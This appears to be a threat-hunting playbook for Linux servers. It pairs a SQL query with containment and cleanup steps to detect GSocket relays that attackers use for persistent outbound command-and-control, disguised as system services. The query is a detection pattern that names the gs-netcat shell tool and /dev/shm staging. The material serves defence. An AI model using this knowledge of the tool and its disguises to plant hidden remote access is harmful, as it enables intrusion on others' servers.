scenario.summary: Threat actors are weaponizing GSocket, a legitimate encrypted relay tool, to maintain persistent outbound-only C2 on compromised Linux servers. By tunneling traffic through the public Global Socket Relay Network, attackers evade inbound firewall restrictions and bypass traditional IP-based blocking even after the initial web application vulnerability is patched.

meta.rationale: Focus on Linux servers running PHP or cPanel environments, as research indicates these are the most common targets. Use the vulnerable host list as a primary anchor, but do not exclude hosts with DNS activity if they are not yet scanned for vulnerabilities.
meta.hypothesis: An intruder has maintained persistent access to a Linux server by deploying a GSocket relay after exploiting a kernel vulnerability, masquerading the relay as a system service while communicating outbound to a shared public network.

hunt.name: Persistent GSocket Encrypted Relay Activity
hunt.description: This hunt identifies Linux hosts weaponized with GSocket (Global Socket) for long-term command and control. Threat actors use the Dirty Frag kernel vulnerability (CVE-2026-43284) to elevate privileges before installing GSocket relays that masquerade as legitimate system services like systemd-remount. Because GSocket connects outbound to a shared public relay network, traditional inbound firewall rules and fixed C2 domain blocking are ineffective. This hunt correlates vulnerability status with rare persistence mechanisms and outbound relay traffic patterns to identify active intrusions that persist even after the initial entry point is patched.

config.content: SELECT LOWER(job_cmd_line) AS cmd, job_name, device_hostname, COUNT(DISTINCT device_hostname) AS hosts, MIN(time) AS first_seen FROM hb_scheduled_job WHERE (instr(',' || '{{gs_service_names}}' || ',', ',' || LOWER(job_name) || ',') > 0 OR job_cmd_line LIKE '%/dev/shm/%' OR job_cmd_line LIKE '%gs-netcat%') AND ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0) AND time >= datetime('now', '-{{lookback_days}} days') GROUP BY LOWER(job_cmd_line), job_name, device_hostname HAVING hosts <= 3 ORDER BY hosts ASC
config.description: Find rare cron or systemd jobs referencing GSocket file names, masqueraded service names, or staging paths like /dev/shm.
config.expected_signal: Rare jobs on a few hosts that use masqueraded names or stage binaries in temporary memory-backed directories. Silence means no known names were found in job definitions.

config.description: Initiate automated containment for malicious findings or route to analyst review for suspicious activity.
Sever the encrypted relay connection and remove persistence components to prevent further command execution.
config.instructions: Isolate the endpoint via the EDR agent. Terminate every process associated with the identified job command lines. Remove identified cron jobs, systemd units, and files in /dev/shm or /tmp as cited by the agent. Revoke sessions for the web service account.

config.description: Confirm the effectiveness of remediation and identify any secondary implants or lateral movement.
config.instructions: Review the agent's findings and the results of the remediation action. Check for other common persistence points like shell profiles (.bashrc) or kernel-thread masqueraded processes. Schedule a kernel update to patch CVE-2026-43284.

config.description: Document findings for detection engineering and close the incident.
config.instructions: Record all identified indicators of compromise. Update the enterprise blocklist for GSocket relay domains and provide a summary of the masquerading names used in the intrusion to the detection team.
